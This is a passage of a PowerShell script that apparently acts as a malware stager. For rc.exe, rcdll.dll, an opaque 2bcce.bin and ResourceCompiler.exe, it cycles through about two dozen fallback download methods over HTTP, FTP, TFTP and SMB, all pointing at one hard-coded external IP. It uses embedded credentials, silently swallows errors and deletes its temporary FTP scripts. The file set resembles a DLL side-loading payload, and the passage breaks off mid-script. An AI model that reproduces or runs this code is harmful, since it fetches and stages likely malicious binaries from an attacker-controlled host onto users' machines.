        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("rc.exe"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("rc.exe", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "rc.exe")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\rc.exe" -Destination "rc.exe" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\rc.exe" "rc.exe"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'net use Z: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Z:\rc.exe" -Destination "rc.exe" -ErrorAction Stop
            cmd /c 'net use Z: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Z: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "rc.exe")) {
    try {
        New-PSDrive -Name "TempSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
        Copy-Item -Path "TempSMB:\rc.exe" -Destination "rc.exe" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "rc.exe")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB:\rc.exe" -Destination "rc.exe" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'net use Y: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Y:\rc.exe" -Destination "rc.exe" -ErrorAction Stop
            cmd /c 'net use Y: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Y: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "rc.exe")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\rc.exe" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "rc.exe" -Encoding ASCII -NoNewline
    } catch { }
}

# ============
# ============
# ============
# ============
# ============
# ============
# ============ FILE 2: rcdll.dll DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "rcdll.dll")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/rcdll.dll" -OutFile "rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "rcdll.dll")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/rcdll.dll" -OutFile "rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "rcdll.dll")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/rcdll.dll", "rcdll.dll")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "rcdll.dll")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/rcdll.dll" -Destination "rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'curl -o rcdll.dll http://73.213.108.128:8081/rcdll.dll' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/rcdll.dll -O rcdll.dll' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "rcdll.dll")) {
    try {
        [System.IO.File]::WriteAllBytes("rcdll.dll", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/rcdll.dll").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "rcdll.dll")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/rcdll.dll").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("rcdll.dll", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "rcdll.dll")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/rcdll.dll", "rcdll.dll")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "rcdll.dll")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rcdll.dll", "rcdll.dll")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "rcdll.dll")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rcdll.dll", "rcdll.dll")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'curl -o rcdll.dll ftp://73.213.108.128/rcdll.dll' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'curl -u admin:password123 -o rcdll.dll ftp://73.213.108.128/rcdll.dll' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "rcdll.dll")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get rcdll.dll rcdll.dll
quit
"@
        $ftpScript | Out-File -FilePath "ftpscript2.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpscript2.txt' 2>$null
        Remove-Item -Path "ftpscript2.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "rcdll.dll")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get rcdll.dll rcdll.dll
quit
"@
        $ftpScript | Out-File -FilePath "ftpauth2.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpauth2.txt' 2>$null
        Remove-Item -Path "ftpauth2.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET rcdll.dll rcdll.dll' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'tftp 73.213.108.128 get rcdll.dll rcdll.dll' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET rcdll.dll rcdll.dll' 2>$null
    } catch { }
}

if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET rcdll.dll rcdll.dll' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "rcdll.dll")) {
    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("rcdll.dll"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("rcdll.dll", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "rcdll.dll")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\rcdll.dll" -Destination "rcdll.dll" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\rcdll.dll" "rcdll.dll"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'net use X: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "X:\rcdll.dll" -Destination "rcdll.dll" -ErrorAction Stop
            cmd /c 'net use X: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use X: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "rcdll.dll")) {
    try {
        New-PSDrive -Name "TempSMB2" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
        Copy-Item -Path "TempSMB2:\rcdll.dll" -Destination "rcdll.dll" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB2" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB2" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "rcdll.dll")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB2" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB2:\rcdll.dll" -Destination "rcdll.dll" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB2" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB2" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "rcdll.dll")) {
    try {
        cmd /c 'net use W: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "W:\rcdll.dll" -Destination "rcdll.dll" -ErrorAction Stop
            cmd /c 'net use W: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use W: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "rcdll.dll")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\rcdll.dll" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "rcdll.dll" -Encoding ASCII -NoNewline
    } catch { }
}

# ============
# ============
# ============
# ============
# ============
# ============
# ============ FILE 3: 2bcce.bin DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "2bcce.bin")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/2bcce.bin" -OutFile "2bcce.bin" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "2bcce.bin")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/2bcce.bin" -OutFile "2bcce.bin" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "2bcce.bin")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/2bcce.bin", "2bcce.bin")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "2bcce.bin")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/2bcce.bin" -Destination "2bcce.bin" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'curl -o 2bcce.bin http://73.213.108.128:8081/2bcce.bin' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/2bcce.bin -O 2bcce.bin' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "2bcce.bin")) {
    try {
        [System.IO.File]::WriteAllBytes("2bcce.bin", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/2bcce.bin").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "2bcce.bin")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/2bcce.bin").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("2bcce.bin", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "2bcce.bin")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/2bcce.bin", "2bcce.bin")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "2bcce.bin")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/2bcce.bin", "2bcce.bin")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "2bcce.bin")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/2bcce.bin", "2bcce.bin")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'curl -o 2bcce.bin ftp://73.213.108.128/2bcce.bin' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'curl -u admin:password123 -o 2bcce.bin ftp://73.213.108.128/2bcce.bin' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "2bcce.bin")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get 2bcce.bin 2bcce.bin
quit
"@
        $ftpScript | Out-File -FilePath "ftpscript.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpscript.txt' 2>$null
        Remove-Item -Path "ftpscript.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "2bcce.bin")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get 2bcce.bin 2bcce.bin
quit
"@
        $ftpScript | Out-File -FilePath "ftpauth.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpauth.txt' 2>$null
        Remove-Item -Path "ftpauth.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET 2bcce.bin 2bcce.bin' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'tftp 73.213.108.128 get 2bcce.bin 2bcce.bin' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET 2bcce.bin 2bcce.bin' 2>$null
    } catch { }
}

if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET 2bcce.bin 2bcce.bin' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "2bcce.bin")) {
    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("2bcce.bin"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("2bcce.bin", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "2bcce.bin")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\2bcce.bin" -Destination "2bcce.bin" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\2bcce.bin" "2bcce.bin"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'net use Z: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Z:\2bcce.bin" -Destination "2bcce.bin" -ErrorAction Stop
            cmd /c 'net use Z: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Z: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "2bcce.bin")) {
    try {
        New-PSDrive -Name "TempSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
        Copy-Item -Path "TempSMB:\2bcce.bin" -Destination "2bcce.bin" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "2bcce.bin")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB:\2bcce.bin" -Destination "2bcce.bin" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "2bcce.bin")) {
    try {
        cmd /c 'net use Y: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Y:\2bcce.bin" -Destination "2bcce.bin" -ErrorAction Stop
            cmd /c 'net use Y: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Y: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "2bcce.bin")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\2bcce.bin" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "2bcce.bin" -Encoding ASCII -NoNewline
    } catch { }
}


# ============
# ============
# ============
# ============
# ============
# ============
# ============ FILE 4: ResourceCompiler.exe DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/ResourceCompiler.exe" -OutFile "ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/ResourceCompiler.exe" -OutFile "ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/ResourceCompiler.exe", "ResourceCompiler.exe")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/ResourceCompiler.exe" -Destination "ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'curl -o ResourceCompiler.exe http://73.213.108.128:8081/ResourceCompiler.exe' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/ResourceCompiler.exe -O ResourceCompiler.exe' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        [System.IO.File]::WriteAllBytes("ResourceCompiler.exe", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/ResourceCompiler.exe").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/ResourceCompiler.exe").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("ResourceCompiler.exe", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/ResourceCompiler.exe", "ResourceCompiler.exe")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/ResourceCompiler.exe", "ResourceCompiler.exe")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/ResourceCompiler.exe", "ResourceCompiler.exe")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'curl -o ResourceCompiler.exe ftp://73.213.108.128/ResourceCompiler.exe' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'curl -u admin:password123 -o ResourceCompiler.exe ftp://73.213.108.128/ResourceCompiler.exe' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get ResourceCompiler.exe ResourceCompiler.exe
quit
"@
        $ftpScript | Out-File -FilePath "ftpscript.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpscript.txt' 2>$null
        Remove-Item -Path "ftpscript.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get ResourceCompiler.exe ResourceCompiler.exe
quit
"@
        $ftpScript | Out-File -FilePath "ftpauth.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpauth.txt' 2>$null
        Remove-Item -Path "ftpauth.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET ResourceCompiler.exe ResourceCompiler.exe' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp 73.213.108.128 get ResourceCompiler.exe ResourceCompiler.exe' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET ResourceCompiler.exe ResourceCompiler.exe' 2>$null
    } catch { }
}

if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET ResourceCompiler.exe ResourceCompiler.exe' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
